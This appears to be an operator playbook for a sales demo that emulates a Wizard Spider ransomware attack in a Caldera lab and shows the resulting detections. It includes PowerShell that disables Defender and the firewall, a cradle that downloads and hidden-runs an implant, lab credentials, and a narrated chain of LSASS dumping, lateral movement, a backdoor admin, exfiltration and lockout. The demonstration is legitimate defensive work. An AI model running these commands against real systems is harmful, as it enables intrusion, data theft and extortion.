---
type: Operator Playbook
title: "Playbook — Operation Crimson Tide"
description: Step-by-step execution guide for demonstrating Operation Crimson Tide (Wizard Spider ransomware) in the Caldera lab. Covers pre-attack setup, agent deployment, operation launch, phase-by-phase narration, and cleanup.
tags:
  - playbook
  - operation
  - ransomware
  - wizard-spider
  - crimson-tide
generated:
  by: claude-sonnet-4-6
  at: '2026-07-31T00:00:00Z'
status: stable
---

# Playbook — Operation Crimson Tide

**Scenario:** Wizard Spider ransomware — financially motivated, purchased credential  
**Threat actor:** Eastern European ransomware affiliate  
**Duration:** 10–15 min active demo (fast jitter, batch planner)  
**Caldera instance:** caldera-1 — http://192.168.8.121:8888  
**Entry point:** windows-the-boss (192.168.3.31) — department head workstation  
**Kill chain:** windows-the-boss → windows-client-11 + windows-dc (simultaneous)  
**Tone for customer:** Fast and loud. No patience. Every second counts. From RDP connection to domain-wide encryption in 43 minutes.

---

## Pre-Attack Setup

**Do this before the customer enters the room.**

### 1. Disable defenses on all three target hosts

RDP or PowerShell remote into each host and run:

- **windows-the-boss** — 192.168.3.31 (lab-user / Paloalto1!)
- **windows-client-11** — 192.168.3.32 (lab-user / Paloalto1!)
- **windows-dc** — 192.168.1.31 (administrator / Paloalto1!)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

> **Note:** Crimson Tide's kill chain includes abilities that open firewall rules and disable execution policy — those are part of the demo TTPs. The above just ensures the initial agent deployment isn't blocked.

### 2. Verify Caldera is up and pre-configured

Open http://192.168.8.121:8888 (admin / admin).

- Go to **Adversaries** → confirm "Operation Crimson Tide - Ransomware" exists (ID: `a17c9651-4ebb-4883-b67b-d5854eb512c1`)
- Go to **Sources** → confirm "Crimson Tide - Lab Targets" exists (ID: `a1b2c3d4-0002-0002-0002-000000000002`)
- Go to **Agents** → confirm no stale agents are registered from a previous demo

### 3. Set up the entry point narrative

This scenario opens with the attacker already logged in via RDP — a purchased credential. You have two options for setting the scene:

**Option A (visual):** Have an RDP session to windows-the-boss already open on a visible screen before the customer enters. Someone else's desktop, Outlook mid-compose. Then narrate the affiliate sitting down and starting the checklist. This is the most dramatic framing.

**Option B (direct):** Start the demo from the Caldera UI without the RDP theater. Narrate the credential purchase and RDP entry verbally.

### 4. Stage the XSIAM console

Open the XSIAM incident view on auto-refresh. This demo generates significant alert volume quickly — the customer should see the cascade as it happens.

---

## Phase 1 — Deploy the Agent (Attacker Logs In)

**Narrative:** *"The credential was bought for $4,200. Lab-user on windows-the-boss — a department head with DA-adjacent access. The affiliate tried RDP. It connected on the first attempt. They minimized Outlook and started the checklist."*

### 5. RDP into windows-the-boss

Connect to **192.168.3.31** as `lab-user / Paloalto1!`.

Open PowerShell (run as normal user).

### 6. Deploy the Sandcat agent

```powershell
$url="http://192.168.8.121:8888/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1]
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)
Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

### 7. Confirm agent check-in

Caldera UI → **Agents** → agent for `windows-the-boss` appears within 10–15 seconds.

> **Talking point:** *"The implant is running. The affiliate is now operating remotely — they never step foot in the building. Everything from here is remote."*

---

## Phase 2 — Launch the Operation

### 8. Create and launch the operation

In the Caldera UI: **Operations** → **+ New Operation**.

| Field | Value |
|---|---|
| Name | `Operation Crimson Tide` |
| Adversary | `Operation Crimson Tide - Ransomware` |
| Group | `red` |
| Planner | `batch` |
| Fact Source | `Crimson Tide - Lab Targets` |
| Obfuscator | `plain-text` |
| Jitter | `1/3` |
| Autonomous | `on` |
| Auto-close | `on` |
| Visibility | `51` |

Click **Start**.

> **Planner note:** Batch planner runs all applicable abilities simultaneously each round — exactly what a ransomware operator does. No patience, no waiting. Jitter is 1–3 seconds for the same reason.

Via API:
```
POST http://192.168.8.121:8888/api/v2/operations
{
  "name": "Operation Crimson Tide",
  "adversary": {"adversary_id": "a17c9651-4ebb-4883-b67b-d5854eb512c1"},
  "group": "red",
  "planner": {"id": "788107d5-dc1e-4204-9269-38df0186d3e7"},
  "source": {"id": "a1b2c3d4-0002-0002-0002-000000000002"},
  "obfuscator": "plain-text",
  "jitter": "1/3",
  "autonomous": 1,
  "auto_close": true,
  "visibility": 51
}
```

---

## Phase 3 — Live Narration: Execution Walk-Through

This operation moves fast. Narrate in real time as abilities complete. The batch planner runs multiple abilities simultaneously — you may see several complete at once.

### Phase 3a — Arm and Blind (Abilities 1–5, ~2 min)

**Narrative:** *"The first 15 minutes are mechanical. The affiliate has done this hundreds of times. It's a checklist. They're not thinking about each step — they're just moving."*

| Ability | What's happening | What to say |
|---|---|---|
| PowerShell execution | Confirms execution capability | *"PowerShell ready."* |
| AMSI bypass | Script-scanning interface disabled | *"AMSI down. No more AV inspection on scripts."* |
| Allow firewall rules | SMB + RDP opened on Windows Firewall | *"Firewall rules added for lateral movement. That's preparation — they know exactly where they're going."* |
| Bypass ExecutionPolicy | PS execution policy disabled | *"No more execution restrictions. Anything runs."* |

**Pause and show XSIAM.** Multiple alerts should have fired simultaneously — AMSI modification, firewall rule change, execution policy change. This is where XDR shines: these are separate Windows events, but XDR correlates them into a single "Defense Evasion" incident.

### Phase 3b — Map the Domain (Abilities 5–9, ~3 min)

| Ability | What's happening | What to say |
|---|---|---|
| Adfind — computers | AD computer list retrieved | *"Every machine in the domain. Found the DC instantly."* |
| Adfind — DC | Domain controller identified | *"One DC. Known password. Same password the whole org uses."* |
| Adfind — subnets | Network subnets mapped | *"Full network map in under a minute."* |
| Network connections | Active TCP connections listed | *"They see where traffic is going. They see the backup server. They see the file server."* |

### Phase 3c — Harvest Credentials (Abilities 9–12, ~3 min)

| Ability | What's happening | What to say |
|---|---|---|
| Cached credential dump | Cmdkey cached creds extracted | *"Already authenticated credentials, ready to use."* |
| Unattend.xml | Config files scanned for hardcoded passwords | *"They're checking every standard credential location. Old setup files, deployment configs."* |
| Browser credential theft | Chrome/Edge/Firefox saved passwords | *"Browser saved passwords. Developers use browsers like password managers."* |
| LSASS dump | Domain credentials from LSASS memory | *"LSASS gives them everything. The administrator hash for the DC is right there."* |

### Phase 3d — Spread to All Hosts (Abilities 13–14, ~2 min)

**Narrative:** *"The spread took eleven minutes. Three machines, total coverage."*

| Ability | What's happening | What to say |
|---|---|---|
| SMB lateral to windows-client-11 | Sandcat copied via ADMIN$ share | *"Using the credential, they connect to windows-client-11's admin share. Copy the implant. Done."* |
| PsExec to windows-dc | Sandcat pushed to DC via PsExec | *"Administrator credential from LSASS. PsExec to the domain controller. SYSTEM on the DC in under two minutes."* |

Watch **Agents** — two new agents appear almost simultaneously for `windows-client-11` and `windows-dc`.

**This is the key moment.** Three agents. Total domain coverage. Show the customer the Agents panel. All three hosts compromised.

> **Talking point:** *"The attacker just achieved their minimum viable footprint. From here, the operation is over. They have the keys to everything. Everything that follows is cleanup and payday."*

### Phase 3e — Plant the Flag (Abilities 15–17, ~2 min)

| Ability | What's happening | What to say |
|---|---|---|
| Create domain admin account | `svc_helpdesk_02` added to Domain Admins | *"Backdoor account. Re-entry in case something goes wrong before they finish. Old habit."* |
| Scheduled task persistence | Persistence on all hosts | *"Even if they're caught, they can come back."* |

### Phase 3f — Stage and Exfil (Abilities 17–19, ~3 min)

| Ability | What's happening | What to say |
|---|---|---|
| Collect files | Sensitive files staged from all accessible shares | *"Automated search — CONTRACTS_ACTIVE, HR_CONFIDENTIAL. They're building the double-extortion package."* |
| Archive | Files compressed and password-protected | *"Everything in a single encrypted archive."* |
| Exfil over C2 | Archive exfiltrated before encryption | *"Data is gone before the ransomware runs. The encryption is almost a formality. The exfil is the real leverage."* |

> **Talking point:** *"This is double extortion — a technique that emerged around 2019. The data is already in Bucharest before the files are encrypted. Even if the victim restores from backup, the threat of leaking 40GB of HR and contract data holds."*

### Phase 3g — Detonate (Abilities 20–23, ~2 min)

**Narrative:** *"Now came the part they'd been building toward."*

| Ability | What's happening | What to say |
|---|---|---|
| Disable System Restore | Registry key disables System Restore | *"Every road back — cut."* |
| Disable Windows Recovery | BCDEdit disables Recovery Environment | *"No WinRE. No F8 boot options. No rollback."* |
| Drop ransomware (Akira-style) | Ransom note created, files targeted for encryption | *"The binary drops silently. It doesn't announce itself. It just begins — alphabetically, methodically — working through every file it can reach."* |
| Change user passwords | All accounts locked out in sequence | *"Final door. Slammed shut. Every account on every machine, locked. DC last."* |

**Show the Caldera operation completion.** Auto-close fires when the last ability completes.

**Switch to the affected hosts.** If you have RDP sessions open, the desktop will show the ransomware note or the session will have dropped (password change locks you out).

---

## Phase 4 — XSIAM Wrap-Up

Switch fully to XSIAM console.

**Walk the incident timeline from start to finish:**

1. **T+00:00** — Encoded PowerShell execution on windows-the-boss (Initial Access)
2. **T+00:45** — AMSI bypass, firewall modification, ExecutionPolicy change (Defense Evasion cluster)
3. **T+02:00** — Adfind.exe LDAP queries (Discovery)
4. **T+03:30** — LSASS memory access (Credential Access — high severity)
5. **T+04:30** — ADMIN$ write + service creation on windows-client-11 (Lateral Movement)
6. **T+04:35** — PSEXESVC service on windows-dc (Lateral Movement to DC — critical)
7. **T+05:00** — New AD user `svc_helpdesk_02` + immediate Domain Admin group membership (Persistence — high)
8. **T+06:30** — BCDEdit `recoveryenabled no`, VSS deletion (Impact — pre-ransomware signal)
9. **T+07:00** — Mass file operations + ransom note creation (Impact — ransomware)
10. **T+07:30** — Bulk account password changes (Impact — lockout)

**Key talking points:**

- *"43 minutes from credential to encrypted domain. XDR generated the first alert at minute zero — the encoded PowerShell. The question is: would your SOC have acted on it in time?"*
- *"The pre-ransomware signal — BCDEdit disabling recovery — is a reliable leading indicator. Any time you see that in your environment, ransomware deployment is minutes away. A XSIAM XSOAR playbook can auto-isolate the host on this event."*
- *"The double-extortion exfil happened before the encryption. Standard backup restoration doesn't help. Data is already gone."*

---

## Cleanup (After Demo)

```powershell
# Re-enable Windows Defender on all hosts
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Remove backdoor account
Remove-ADUser -Identity "svc_helpdesk_02" -Confirm:$false

# Restore System Restore (if disabled)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 0 /f

# Re-enable Windows Recovery
bcdedit /set {default} recoveryenabled yes

# Reset any changed passwords (run on DC as administrator)
Set-ADAccountPassword -Identity "lab-user" -NewPassword (ConvertTo-SecureString "Paloalto1!" -AsPlainText -Force) -Reset

# Kill Sandcat processes on all hosts
Get-Process | Where-Object { $_.Path -like "C:\Users\Public\*" } | Stop-Process -Force

# Remove scheduled tasks
schtasks /delete /tn "* Sandcat *" /f 2>$null
```

In Caldera: **Operations** → stop/delete "Operation Crimson Tide". **Agents** → kill and delete all agents.

> **Important:** If ransomware actually encrypted files in the demo environment, you may need to restore from a VM snapshot rather than manual cleanup. Confirm with the lab owner whether Akira simulation in this build encrypts real files or only simulates the note.

---

## Quick Reference

| Item | Value |
|---|---|
| Caldera URL | http://192.168.8.121:8888 |
| Caldera creds | admin / admin |
| Entry point | windows-the-boss (192.168.3.31) lab-user / Paloalto1! |
| Adversary ID | a17c9651-4ebb-4883-b67b-d5854eb512c1 |
| Fact Source ID | a1b2c3d4-0002-0002-0002-000000000002 |
| Planner | batch |
| Obfuscator | plain-text |
| Jitter | 1/3 |
| Expected duration | 10–15 min |
